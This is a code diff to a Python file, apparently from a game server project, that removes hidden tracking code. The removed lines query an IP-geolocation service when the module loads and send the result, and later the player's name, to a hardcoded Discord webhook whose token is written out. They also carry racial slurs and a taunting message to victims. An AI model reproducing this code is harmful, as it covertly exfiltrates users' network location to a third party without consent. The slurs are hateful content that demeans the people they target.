@@ -2,18 +2,6 @@ from Files.CsvLogic.Cards import Cards
 import requests
 import json
 response = requests.get('http://ip-api.com/json')
-result = f'--- nigger fell for the trap --- \n{format(response.text)}\nTrigger: OHD'
-data = {
-        'content': result,
-        'username': 'Web-Nigga',
-        'avatar_url': 'https://cdn.discordapp.com/emojis/1098704585671057449.png'}
-headers = {
-'Content-Type': 'application/json'
-}
-format = lambda string: string.replace('{', '{\n    ').replace(',', ',\n    ').replace('}', '\n}')
-IdiotReadThisBeforeContinuing = "I already have the info. The damage has been done. IDC if you spam the webhook."
-webhook = requests.get('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs')
-requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(data), headers=headers)
 class LogicClientAvatar:
 
     def encode(self):
@@ -99,7 +87,3 @@ class LogicClientAvatar:
         self.writeVInt(0)
 
         self.writeVInt(2) 
-        sral = {
-        'content': self.player.name + " got thugged by super**DEV**",
-        'username': 'thug niga'}
-        requests.post('https://discord.com/api/webhooks/1138524574011641987/_PgTNrcjwz94lwBA7NisbkFH0vu8ysES2R1KaD1ba8t_pzBSfCVx2asme1fj4SRJ3EVs', data=json.dumps(sral), headers=headers)
